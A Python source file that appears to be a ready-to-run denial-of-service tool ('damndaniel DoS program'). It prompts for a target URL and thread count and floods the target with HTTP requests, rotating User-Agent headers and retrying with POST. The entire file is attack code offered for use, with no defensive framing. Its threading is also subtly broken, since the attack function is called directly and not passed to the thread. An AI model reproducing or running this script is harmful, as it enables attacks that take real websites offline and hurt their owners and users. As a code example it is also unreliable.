import requests
import threading
import random
import time
import sys
import signal

def sigint_handler(signum, frame):
    res = input("Ctrl-c was pressed. Do you really want to exit? y/n ")
    if res == 'y':
        exit(1)

def attack(target):
    count = 0
    user_agents = [line.strip("\n") for line in open("list/useragents.txt", "r", encoding="utf-8").readlines()]
    for ua in user_agents:
        count += 1
        headers = {
            "User-Agent": str(ua),
            "Cache-Control": "no-cache",
            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Keep-Alive": str(random.randint(110, 160)),
            "Connection": "keep-alive",
        }
        try: 
            r = requests.get(url=target, headers=headers)
            if r.status_code == 405:
                r = requests.post(url=target, headers=headers)
            elif r.status_code == 429:
                print("[!] 429 code encountered, cooling down for 30 seconds.")
                time.sleep(30)
            elif r.status_code == 404:
                print("[!] Server not found. Quitting...")
                sys.exit()
            print(f"[+] Request #{count} completed.")
        except Exception as e:
            raise e
        
def main():
    signal.signal(signal.SIGINT, sigint_handler)
    print("=== damndaniel DoS program ver 1.0 ===")
    target = input("[!] Enter Target > ")
    threads = input("[!] How many thread? (eg. 500) > ")
    print("[!] Program is starting in 5 seconds.")
    print("[!] To cancel: press Ctrl + C")
    time.sleep(5)
    for i in range(int(threads)):
        thread = threading.Thread(target=attack(target=target))
        thread.start()

if __name__ == "__main__":
    main()
